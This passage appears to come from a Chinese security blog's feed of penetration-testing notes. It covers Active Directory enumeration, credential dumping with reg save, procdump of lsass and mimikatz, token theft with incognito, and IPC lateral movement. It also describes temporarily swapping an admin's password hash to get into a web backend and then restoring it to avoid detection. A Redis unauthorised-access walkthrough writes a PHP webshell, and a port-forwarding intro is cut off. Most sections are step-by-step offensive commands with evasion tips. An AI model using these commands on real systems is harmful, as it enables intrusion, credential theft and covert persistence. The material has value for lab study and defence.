<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>首先我们用<code>curl</code>来将请求换成<code>ceye</code>看看其中发送了什么数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -F &quot;files&#x3D;@phpinfo.php&quot; ceye地址</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/zergmxtle9ei2zl6c0zh4vl9/image_1dsrf5dn41jgkbdq1ekts3nln613.png" alt="image_1dsrf5dn41jgkbdq1ekts3nln613.png-26.3kB"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--------------------------4bb40881c6a8e593</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;files&quot;; filename&#x3D;&quot;phpinfo.php&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Type: application&#x2F;octet-stream</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">&quot;&lt;?php phpinfo();?&gt;&quot; </span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">--------------------------4bb40881c6a8e593</span></pre></td></tr></table></figure>

<p>可以看到这里只是一个正常的上传请求，也就是说这个漏洞就是一个任意文件上传。。。。。。</p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>初始域渗透简略笔记</title>
    <url>/2019/12/24/%E5%88%9D%E5%A7%8B%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AE%80%E7%95%A5%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>这篇文章是根据<code>ske</code>师傅的视频写的笔记，视频地址：<a href="https://www.bilibili.com/video/av76554533?from=search&amp;seid=11390449822159779985" target="_blank" rel="noopener">https://www.bilibili.com/video/av76554533?from=search&amp;seid=11390449822159779985</a></p>
<blockquote>
<p>写这篇文章只是记录看这个视频的笔记，等哪天有实战环境了会自己出一张更详细的</p>
</blockquote>
<h2 id="1、什么是域"><a href="#1、什么是域" class="headerlink" title="1、什么是域"></a>1、什么是域</h2><p>域英文叫<code>DOMAIN</code>，将网络中多台计算机逻辑组织到一起，进行集中管理，这种区别于环境组的逻辑环境叫做域</p>
<p>简单来说，假设我的公司有很多个计算机，然后我想设置一些配置，比如修改密码、设置权限等，只需要对域进行操作，就可以直接更改域下面的计算机，就和团队老大一样的意思，在群里艾特全体成员，说你们明天不用上班一样。方便快速，不用一个一个去说。</p>
<h2 id="2、域控（全称域控制器）"><a href="#2、域控（全称域控制器）" class="headerlink" title="2、域控（全称域控制器）"></a>2、域控（全称域控制器）</h2><p>在一个机器上装上活动目录（存储了有关网络对象信息，并且让管理员和用户能够轻松的查找和使用这些信息。网络对象可以是用户、群组、电脑、网域控制器、邮件、配置文件、组织单元、树系等）后，这个机器就是一个域控服务器</p>
<p>在一个内网中，可能有很多个域控，他们是没有区分的。</p>
<p>假设你有三个域控制器<code>a、b、c</code>，那么你在<code>a</code>对用户权限进行修改，那么他会复制到<code>b、c</code>里，如果其中一台域控制器发生故障，其他域控还能正常工作的话，整个域还是可以正常运行的。</p>
<h2 id="3、域用户"><a href="#3、域用户" class="headerlink" title="3、域用户"></a>3、域用户</h2><p>就是域控制器的用户，域用户的账号密码可以登陆同一域下的任何机器，但是只是普通权限，而非管理员权限。</p>
<h2 id="4、域管"><a href="#4、域管" class="headerlink" title="4、域管"></a>4、域管</h2><p>可以登陆域控制器上，对一切权限进行控制，域管只需要登陆到域上面进行操作，任何就会应用到域机器，而不用去每台电脑前操作。</p>
<h2 id="5、组"><a href="#5、组" class="headerlink" title="5、组"></a>5、组</h2><p>将不同用户放入不同的分组里，然后对每个组进行一个权限设置，这样子简单方便的对每一台机器进行权限分配，而不用每个去设置。</p>
<h2 id="6、信任域"><a href="#6、信任域" class="headerlink" title="6、信任域"></a>6、信任域</h2><p>比如公司下面有子公司，他们都有域，并且处于同一个内网，那么只要子公司的域建立了对母公司的域的信任，那么母公司的域的域用户，就可以登陆到子公司的域，而子公司的域用户不能登陆到母公司的域用户，实战中可能遇到的域不知一个，那么我们可以在当前域查看信任域，然后利用横向渗透登陆到其他域控制器。</p>
<h2 id="7、域信息收集"><a href="#7、域信息收集" class="headerlink" title="7、域信息收集"></a>7、域信息收集</h2><h3 id="使用nltest查询信用域"><a href="#使用nltest查询信用域" class="headerlink" title="使用nltest查询信用域"></a>使用<code>nltest</code>查询信用域</h3><blockquote>
<p><code>nltest</code>在<code>03</code>以后系统自带的</p>
</blockquote>
<p>信任域：可以在工作组里查询，查询内网是否有域环境</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如下命令就可以查找域控IP所有信任域信息</span></pre></td></tr><tr><td class="code"><pre><span class="line">nltest &#x2F;domain_trusts &#x2F;all_trusts &#x2F;v &#x2F;server:域控IP</span></pre></td></tr></table></figure>

<p>用<code>ipconfig /all</code>就可以查找域控<code>IP</code>，如图</p>
<p><img src="http://static.zybuluo.com/1kbfree/s7qidld8ml453m0v6fx1dygn/image_1dsneccj2a6a1gu1o0sf141r8v9.png" alt="image_1dsneccj2a6a1gu1o0sf141r8v9.png-76.5kB"></p>
<p>然后执行<code>nltest</code>后如图</p>
<p><img src="http://static.zybuluo.com/1kbfree/5tendlg3zytc56fis3zy5s2i/image_1dsneg3a41k8g1b2479acrh24jm.png" alt="image_1dsneg3a41k8g1b2479acrh24jm.png-39.5kB"></p>
<blockquote>
<p>可能实战中，信任域环境不仅仅一个</p>
</blockquote>
<p>知道信任域名字(<code>HACK</code>)后，可以使用如下命令查找详细的信任域信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nltest &#x2F;dsgetdc:HACK &#x2F;server:域控IP</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/tv7vgpp1il5hl89b6spu07l2/image_1dsnek8u4ch3ooncgq16t14lv13.png" alt="image_1dsnek8u4ch3ooncgq16t14lv13.png-68.3kB"></p>
<p>可以用这种办法查找是否存在域环境</p>
<h3 id="域信息收集Csvde"><a href="#域信息收集Csvde" class="headerlink" title="域信息收集Csvde"></a>域信息收集<code>Csvde</code></h3><blockquote>
<p><code>Csvde</code>是<code>Window Server 2008</code>的内置命令行工具，位于<code>%windir%/system32</code>文件夹中。</p>
</blockquote>
<p>使用如下命令查找<code>HACK</code>这个域的详细信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">csvde -setspn hack -f 导出的地址</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/ogofuywl5i8ci0oztxzn9r04/image_1dsnk16o016a3q3418sf1h4ndif3d.png" alt="image_1dsnk16o016a3q3418sf1h4ndif3d.png-122kB"></p>
<h4 id="导出的数据信息"><a href="#导出的数据信息" class="headerlink" title="导出的数据信息"></a>导出的数据信息</h4><p><img src="http://static.zybuluo.com/1kbfree/d5ihihcdvs8joex3o8v1n9vp/image_1dsnk09epmean5de8alubinb30.png" alt="image_1dsnk09epmean5de8alubinb30.png-724.4kB"></p>
<h3 id="查找域内各种服务资源的对应关系setspn"><a href="#查找域内各种服务资源的对应关系setspn" class="headerlink" title="查找域内各种服务资源的对应关系setspn"></a>查找域内各种服务资源的对应关系<code>setspn</code></h3><blockquote>
<p><code>spn</code>官方名称是服务主体名称，存着的信息是域内的各种服务器的机器名、服务端口号等</p>
</blockquote>
<p>如下命令查找<code>HACK</code>域的<code>spn</code>信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setspn -T hack -Q *&#x2F;*</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/90svm7g8yi1oausjr9lsujtq/image_1dsnkc0qv147sq4fbql1ca9tmh3q.png" alt="image_1dsnkc0qv147sq4fbql1ca9tmh3q.png-164.3kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/oxb0bi3k8vjj1hng7ca3p6a0/image_1dsnkcdvbuts1fq1n361j3h7j747.png" alt="image_1dsnkcdvbuts1fq1n361j3h7j747.png-314kB"></p>
<p>用处就是，比如护网期间，获取了域控权限，然后我们可以看域内下面的开发的服务，比如<code>mysql</code>，然后使用域用户登录到那台机器，然后连接<code>mysql</code>就可以看到数据，然后提交到获取护网分数。</p>
<h3 id="dnsdump查找域下名称和IP"><a href="#dnsdump查找域下名称和IP" class="headerlink" title="dnsdump查找域下名称和IP"></a><code>dnsdump</code>查找域下名称和<code>IP</code></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dnsdump.exe 域名\域用户 -p 域密码 域控机器名</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/tgnt1i53oj5rkr9tinw7h8tj/image_1dsnksgo01se3diqe9eup6nge4k.png" alt="image_1dsnksgo01se3diqe9eup6nge4k.png-193.7kB"></p>
<h3 id="net"><a href="#net" class="headerlink" title="net"></a><code>net</code></h3><p>假设我们拿下了一个服务器，他是域用户，那么我们可以使用<code>net</code>命令收集一些信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user &#x2F;domain                                获取域用户列表</span></pre></td></tr><tr><td class="code"><pre><span class="line">net group &quot;domain admins&quot; &#x2F;domain               获取域管理员列表</span></pre></td></tr><tr><td class="code"><pre><span class="line">net group &quot;domain controllers&quot; &#x2F;domain          查看域控制器</span></pre></td></tr><tr><td class="code"><pre><span class="line">net group &quot;domain computers&quot; &#x2F;domain            查看域机器</span></pre></td></tr><tr><td class="code"><pre><span class="line">net group &#x2F;domain                               查询域里面的组</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/4n6ato1uk8ij0qg3zlejjxnq/5.png" alt="5.png-79.8kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/3dmwvyzt7mwhzd4vv4lgvth9/6.png" alt="6.png-294.8kB"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net view                                        查看同一域内机器列表</span></pre></td></tr><tr><td class="code"><pre><span class="line">net view \\ip                                   查看某IP共享</span></pre></td></tr><tr><td class="code"><pre><span class="line">net view \\GHQ                                  查看GHQ计算机的共享资源列表</span></pre></td></tr><tr><td class="code"><pre><span class="line">net view \\domain                               查看内网存在多少个域</span></pre></td></tr><tr><td class="code"><pre><span class="line">net view \\domain:XYZ                           查看XYZ域中的机器列表</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/8a4vfpwtq7194mhbdtpkw1uj/image_1dsno6nm51q1t1j0m1tan1cvl1565ac.png" alt="image_1dsno6nm51q1t1j0m1tan1cvl1565ac.png-269.2kB"></p>
<h3 id="扫描内网段的主机信息和域控机"><a href="#扫描内网段的主机信息和域控机" class="headerlink" title="扫描内网段的主机信息和域控机"></a>扫描内网段的主机信息和域控机</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nbtscan.exe 192.168.52.0&#x2F;24</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/6gnfjllydzodio0bobaq57e0/7.png" alt="7.png-126.5kB"></p>
<p>图里的<code>DC</code>就是表示这个是域控机器</p>
<p>如果不存在域的话结果如下</p>
<p><img src="http://static.zybuluo.com/1kbfree/gzgvl7ytifo7n96k482ogzjb/image_1dsnp3ves9g3d0q12d1ds31kh6b5.png" alt="image_1dsnp3ves9g3d0q12d1ds31kh6b5.png-69.6kB"></p>
<h2 id="域渗透思路"><a href="#域渗透思路" class="headerlink" title="域渗透思路"></a>域渗透思路</h2><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol>
<li>横向渗透（拿下内网<code>shell</code>）</li>
<li>权限维持（以防给管理员发现，然后下线<code>shell</code>）</li>
<li>取密码（获取一个域用户和账号密码，跑弱口令等等）</li>
<li>域信息收集（就是第七步所写的，注意那是在跑出域账户和密码情况下并且登陆后才能收集，如果非域权限是禁止执行那些命令的）</li>
<li>横向渗透（进行域的横向渗透）</li>
<li>取密码（直到取到域管理员账户密码）</li>
<li>获取域管权限（使用域管理员账户和密码登陆）</li>
<li>拿下域控服务器（结局）</li>
</ol>
<p><img src="http://static.zybuluo.com/1kbfree/ece0mbngaax6581xdvt7pc6c/image_1dsnpq3sf19m21iv21mr9ut31rj7bi.png" alt="image_1dsnpq3sf19m21iv21mr9ut31rj7bi.png-195kB"></p>
<h3 id="注册表读取密码"><a href="#注册表读取密码" class="headerlink" title="注册表读取密码"></a>注册表读取密码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg save hklm\system 导出的地址.hiv </span></pre></td></tr><tr><td class="code"><pre><span class="line">reg save hklm\sam 导出的地址.hiv</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/uyfodml5nhszptu5mj8su4q3/4.jpg" alt="4.jpg-11.1kB"></p>
<p>然后就会生成<code>sys.hiv</code>和<code>sam.hiv</code>文件</p>
<p><img src="http://static.zybuluo.com/1kbfree/fnrfth3y08283e97ndo7fqpv/5.jpg" alt="5.jpg-5.1kB"></p>
<p>然后使用<code>mimikatz.exe</code>工具读取密码的<code>hash</code>值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::sam &#x2F;sam:sam.hiv &#x2F;system:sys.hiv&quot;</span></pre></td></tr></table></figure>

<p>问题1：</p>
<p><img src="http://static.zybuluo.com/1kbfree/45mjxw3zrenoz7dybwp9z3ll/image_1dso1aokaq4in6c1h3cjisk00mn.png" alt="image_1dso1aokaq4in6c1h3cjisk00mn.png-4.9kB"></p>
<p>然后跑出的<code>hash</code>放<code>md5</code>网站解密出来就是密码了</p>
<h3 id="lsass读取内存hash"><a href="#lsass读取内存hash" class="headerlink" title="lsass读取内存hash"></a><code>lsass</code>读取内存<code>hash</code></h3><p>比如在内网中，有一个域用户和域管登陆了你拿下的<code>shell</code>的机器，那么在本机中会将他们的账号和密码保存到<code>lsass.exe</code>进程里面，那么我们只要把<code>lsass.exe</code>进程抓取出来然后跑<code>hash</code>就可以了</p>
<blockquote>
<p><code>2008</code>前，他都是明文存储的</p>
</blockquote>
<p>抓取<code>lsass.exe</code>进程为<code>lsass.dmp</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/uf2ev4graycnevmlwzf8w29f/image_1dsodrk67181t1si02g3ofg1dv19.png" alt="image_1dsodrk67181t1si02g3ofg1dv19.png-66.2kB"></p>
<p>然后使用<code>mimikatz.exe</code>将起读取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmo&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/6k6cs2mlawtcfeekrranj3h5/image_1dsoe4llnnbsik31s011gaqe91m.png" alt="image_1dsoe4llnnbsik31s011gaqe91m.png-158kB"></p>
<blockquote>
<p>在目标<code>shell</code>中获取信息，然后放到本地用工具跑出这些数据，可以防止被拦截。</p>
</blockquote>
<p><img src="http://static.zybuluo.com/1kbfree/w0vcl8qirev4f2fy3vhfx8m7/image_1dsoecn2dsc316n1u2mosfi7r13.png" alt="image_1dsoecn2dsc316n1u2mosfi7r13.png-548.7kB"></p>
<h3 id="读取当前机器各种连接工具密码、浏览器保存的密码等"><a href="#读取当前机器各种连接工具密码、浏览器保存的密码等" class="headerlink" title="读取当前机器各种连接工具密码、浏览器保存的密码等"></a>读取当前机器各种连接工具密码、浏览器保存的密码等</h3><blockquote>
<p>下载地址：<br><a href="https://github.com/AlessandroZ/LaZagne/releases/" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne/releases/</a></p>
</blockquote>
<p><img src="http://static.zybuluo.com/1kbfree/6ezmkh24qn3ny9s6dm5b5fo9/image_1dsog5sm11go8ndcvcgrd5nbg20.png" alt="image_1dsog5sm11go8ndcvcgrd5nbg20.png-18.7kB"></p>
<h3 id="凭证窃取"><a href="#凭证窃取" class="headerlink" title="凭证窃取"></a>凭证窃取</h3><blockquote>
<p>下载地址：</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">incognito.exe list_tokens -u</span></pre></td></tr><tr><td class="code"><pre><span class="line">incognito.exe execute -c &quot;HACK&#x2F;Administrator&quot; cmd.exe</span></pre></td></tr><tr><td class="code"><pre><span class="line">窃取HACK&#x2F;Administrator这个域管的凭证，放到cmd.exe进程，这样子我们的cmd就是域管的权限了</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/iuq1k28ksjnatvi3kavwsung/222.png" alt="222.png-363.2kB"></p>
<h3 id="命令行渗透"><a href="#命令行渗透" class="headerlink" title="命令行渗透"></a>命令行渗透</h3><h4 id="为什么涉及命令行渗透？"><a href="#为什么涉及命令行渗透？" class="headerlink" title="为什么涉及命令行渗透？"></a>为什么涉及命令行渗透？</h4><p>1、因为远程登录目标桌面容易被管理员发现，如你将他挤下或者管理员突然间登录进来<br>2、目标管理员可能对服务器禁用远程登录</p>
<p>那么我们可以建立<code>ipc</code>连接，建立了<code>ipc</code>连接的话我们可以对目标进行文件的下载和上传，以及执行命令</p>
<h4 id="建立ipc连接"><a href="#建立ipc连接" class="headerlink" title="建立ipc连接"></a>建立<code>ipc</code>连接</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\你拿下的服务器ip &#x2F;u:用户名 密码</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/nqedhvpnf66d3u64ntww6c9j/image_1dsqrqqqt11u91j7f1l3q9prdue4i.png" alt="image_1dsqrqqqt11u91j7f1l3q9prdue4i.png-45.6kB"></p>
<p>在<code>ipc</code>连接下看目录是这样的</p>
<p><img src="http://static.zybuluo.com/1kbfree/9m5jgrvud0xgzc0nk6jnarl0/9.png" alt="9.png-127.9kB"></p>
<p>将<code>nbrscan.exe</code>放到<code>windows\temp</code>目录下</p>
<p><img src="http://static.zybuluo.com/1kbfree/4jtv3ogmn3pek6m1lw7tpodm/image_1dsqtn8bu390qts1v6hauv6b05k.png" alt="image_1dsqtn8bu390qts1v6hauv6b05k.png-64.7kB"></p>
<p>将<code>hash.txt</code>下载下来</p>
<p><img src="http://static.zybuluo.com/1kbfree/vof0v5epueofvddg2vx90v4e/image_1dsqtqaj61o9h1c5fp61rnfivt61.png" alt="image_1dsqtqaj61o9h1c5fp61rnfivt61.png-126.2kB"></p>
<p>这里直接粘贴了=v=</p>
<p><img src="http://static.zybuluo.com/1kbfree/ewh1m28mv3pcgwsrcvkuregu/image_1dsqv7rgcfn9t1fhp1cki1mog6e.png" alt="image_1dsqv7rgcfn9t1fhp1cki1mog6e.png-333.3kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/ikx81g2yu5o6m7rk1jhbytmu/3333.png" alt="3333.png-260.5kB"></p>
<p>比如你上传的东西很大，那么我们可以使用这种办法</p>
<p><img src="http://static.zybuluo.com/1kbfree/83m594kmea3w5dhqhxz1oizs/image_1dsr14pjr1lovqrh14ha1bg8pgk8n.png" alt="image_1dsr14pjr1lovqrh14ha1bg8pgk8n.png-336.7kB"></p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>有数据库修改权限并且想登陆后台但密码不可逆的小思路解决办法</title>
    <url>/2019/12/23/%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%AE%E6%94%B9%E6%9D%83%E9%99%90%E5%B9%B6%E4%B8%94%E6%83%B3%E7%99%BB%E9%99%86%E5%90%8E%E5%8F%B0%E4%BD%86%E5%AF%86%E7%A0%81%E4%B8%8D%E5%8F%AF%E9%80%86%E7%9A%84%E5%B0%8F%E6%80%9D%E8%B7%AF%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
    <content><![CDATA[<h2 id="办法一"><a href="#办法一" class="headerlink" title="办法一"></a>办法一</h2><blockquote>
<p>比如我们在获取了<code>mysql</code>数据库的用户名和密码后，登入进去，发现后台管理员的密码是贵那么长的数字，且不可逆，然后我们需要获取<code>webshell</code>，那么我们的扩展面可能就得去后台找上传点、命令执行什么的获取<code>shell</code>了</p>
</blockquote>
<p>我之前实战过程中就遇到了这样的情况，那么我的解决方法是（口头描述）</p>
<p>1、把后台用户所有的账户导出来，然后将密码设为<code>123456</code>，爆破用户名<br>2、假设跑出了用户名为<code>Fuck11</code>的密码为<code>123456</code>，然后我们可以去数据库看<code>123456</code>加密后的密码是<code>!@#$$#@!ffuucckk!!875421</code>，那么我们可以将管理员的密码先复制到某个地方备份下来，然后将<code>123456</code>加密后的字符<code>UPDATE</code>上去<br>3、登陆成功后，将管理员原先的加密密码再<code>UPDATE</code>上去（记住一定要备份！！！ 否则管理员突然间发现登陆不上了，一般都会关站检查改密码之类的操作，给发现一次可能就把漏洞修复了数据库密码改了）<br>4、然后就在后台某点发现了上传点成功上传<code>shell</code></p>
<h2 id="办法二"><a href="#办法二" class="headerlink" title="办法二"></a>办法二</h2><blockquote>
<p>有<code>fuckall</code>的<code>md5</code>密码，但解不出来</p>
</blockquote>
<p>我们可以撞库，思路如下</p>
<p>围绕用户名<code>fuckall</code>，制作社工密码字典，就比如你生日是<code>13</code>月<code>68</code>号，然后你叫王德发，然后平常人可能会根据自身信息来设密码，如<code>1368wdf</code>、<code>wdf1368</code>，然后将<code>1368wdf</code>或<code>wdf1368</code>进行<code>MD5</code>加密，然后对比一下，对比成功后加密的<code>MD5</code>对应的明文密码是什么那不可逆的<code>MD5</code>的密码就是什么了。</p>
<p>如<code>yangyangwithgnu</code>师傅<a href="https://www.freebuf.com/vuls/211842.html" target="_blank" rel="noopener">文章</a>中的</p>
<p><img src="http://static.zybuluo.com/1kbfree/174ro9xx1wmnk8ziwoh605ai/image_1dvuhp24l1kmivfk46orrnsu39.png" alt="image_1dvuhp24l1kmivfk46orrnsu39.png-439.1kB"></p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
        <category>技巧</category>
      </categories>
      <tags>
        <tag>小技巧</tag>
      </tags>
  </entry>
  <entry>
    <title>redis漏洞复现写入webshell以及删除建议</title>
    <url>/2019/12/23/redis%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%86%99%E5%85%A5webshell%E4%BB%A5%E5%8F%8A%E5%88%A0%E9%99%A4%E5%BB%BA%E8%AE%AE/</url>
    <content><![CDATA[<h2 id="本地漏洞环境搭建"><a href="#本地漏洞环境搭建" class="headerlink" title="本地漏洞环境搭建"></a>本地漏洞环境搭建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-3.2.0.tar.gz</span></pre></td></tr><tr><td class="code"><pre><span class="line">tar xzf redis-3.2.0.tar.gz</span></pre></td></tr><tr><td class="code"><pre><span class="line">cd redis-3.2.0</span></pre></td></tr><tr><td class="code"><pre><span class="line">make</span></pre></td></tr></table></figure>

<p>修改配置文件为可以远程访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gedit redis.conf</span></pre></td></tr></table></figure>

<p>把<code>bind 127.0.0.1</code>前面加上<code>#</code>注释掉<br>把<code>protected-mode</code>设为<code>no</code></p>
<p><img src="http://static.zybuluo.com/1kbfree/hc3h138yml82yp28nlb8a03z/image_1dso49kbim6ck16cpgd5d1vjap.png" alt="image_1dso49kbim6ck16cpgd5d1vjap.png-122.3kB"></p>
<p>启动<code>redis</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;src&#x2F;redis-server redis.conf</span></pre></td></tr></table></figure>

<h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><blockquote>
<p>靶机IP：192.168.31.131<br>攻击IP：192.168.31.129</p>
</blockquote>
<h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><h3 id="探测目标机是否有redis"><a href="#探测目标机是否有redis" class="headerlink" title="探测目标机是否有redis"></a>探测目标机是否有<code>redis</code></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 192.168.31.131 -A -p 6379 –script redis-info</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/tr6kyf7gd51wow1nf2aqcw65/image_1dso5lhcqq8r1ako1uhp13uq1c421m.png" alt="image_1dso5lhcqq8r1ako1uhp13uq1c421m.png-381.3kB"></p>
<p>探测出有<code>redis</code>服务，使用如下命令连接，查看是否存在未授权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-cli -h 靶机IP</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/gmgn7xk2wv8omp00jcnrzcfb/6.jpg" alt="6.jpg-82.2kB"></p>
<p>连接成功，那么我们使用<code>redis</code>来进行反弹<code>shell</code></p>
<h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><p>假设我靶机存在这么一个目录是<code>web</code>目录，且是<code>php</code>脚本，那么我们可以使用如下命令来进行写入<code>shell</code>（前提是知道目标机的网站目录的绝对路径）</p>
<p><img src="http://static.zybuluo.com/1kbfree/uv8g7vqllftuj8cbsbyjkayc/image_1dso7pt521c6cekqumg1dbu1m2q4l.png" alt="image_1dso7pt521c6cekqumg1dbu1m2q4l.png-13.4kB"></p>
<p>然后使用<code>redis</code>对其目录写入<code>phpinfo()</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.31.131:6379&gt; config set dir &#x2F;root&#x2F;web</span></pre></td></tr><tr><td class="code"><pre><span class="line">OK</span></pre></td></tr><tr><td class="code"><pre><span class="line">192.168.31.131:6379&gt; config set dbfilename shell.php</span></pre></td></tr><tr><td class="code"><pre><span class="line">OK</span></pre></td></tr><tr><td class="code"><pre><span class="line">192.168.31.131:6379&gt; set x &quot;&lt;?php phpinfo();?&gt;&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">OK</span></pre></td></tr><tr><td class="code"><pre><span class="line">192.168.31.131:6379&gt; save</span></pre></td></tr><tr><td class="code"><pre><span class="line">OK</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/t16sk9zm60ngraxea3uvsi8r/image_1dso7sa1q9p2lqfa5mmhppdh5f.png" alt="image_1dso7sa1q9p2lqfa5mmhppdh5f.png-41.4kB"></p>
<p>然后就会在靶机的<code>/root/web</code>目录下写入<code>shell.php</code></p>
<p><img src="http://static.zybuluo.com/1kbfree/m0haz6oxclp90mykcqg2mcyg/image_1dso866b44ha10f31pk81a4p11p96f.png" alt="image_1dso866b44ha10f31pk81a4p11p96f.png-20.2kB"></p>
<p>但是我们利用<code>redis</code>写入的<code>shell</code>是会加入很多其他数据的，如图</p>
<p><img src="http://static.zybuluo.com/1kbfree/7swstgqxduyuta392l3j4zzb/7.jpg" alt="7.jpg-19.1kB"></p>
<p>但是<code>php</code>是具有容错性的，哪怕这样也是可以执行<code>phpinfo()</code></p>
<p><img src="http://static.zybuluo.com/1kbfree/55f6iv8l36xper1o4kin766e/image_1dso8tijc2d1fnbjcvb0f7ed9.png" alt="image_1dso8tijc2d1fnbjcvb0f7ed9.png-622kB"></p>
<p>成功写入<code>shell</code>后，如果不想被管理员发现，除了将木马写隐蔽和免杀外还要将你写入的<code>key</code>删除，比如我上面是用<code>set x &quot;&lt;?php phpinfo();?&gt;&quot;</code>，那么我要将<code>x</code>变量删除</p>
<p><img src="http://static.zybuluo.com/1kbfree/cp24x7eubenqk40gdbm56xqc/8.png" alt="8.png-86.9kB"></p>
<p><strong>注意：如果这里是实战环境，最好不要执行<code>keys *</code>命令，因为如果他们设置的<code>key</code>很多很多，几十万几百万条的话查看<code>key</code>数据可能会把服务器的<code>cpu</code>直接跑满，严重的说机器会直接崩溃，那么我们只要记住写入的<code>key</code>名，然后写完<code>shell</code>后将其<code>del</code>即可，因为这里是我演示的，所以才进行这个错误的示范</strong></p>
<blockquote>
<p>其实<code>redis</code>不仅可以写入<code>webshell</code>还可以反弹<code>shell</code>，但是我一般需求就是获取<code>webshell</code>即可，但是如果目标系统对写入的<code>shell</code>解析有问题，那么我们就不得不反弹<code>shell</code>了（网上有很多这类文章，不写了，一样的）</p>
</blockquote>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>lcx端口转发</title>
    <url>/2019/12/22/lcx%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
<p><code>Lcx</code>是一个端口的转发工具，可以将内网的端口给转发到外网的机器上，然后就可以去连接远程对方内网</p>
</blockquote>
<p>简单来说就是，<code>a</code>机器我可以执行命令，但是我想连接他的<code>3389</code>，但是禁止外网连接，那么我们可以用<code>lcx</code>来把<code>3389</code>端口的流量，转发到我们机器(<strong>必须外网可以访问过来</strong>)的其他端口，比如<code>5555</code>端口，然后连接只要连接<code>127.0.0.1:5555</code>就可以连接<code>a</code>机器的<code>3389</code>了。</p>
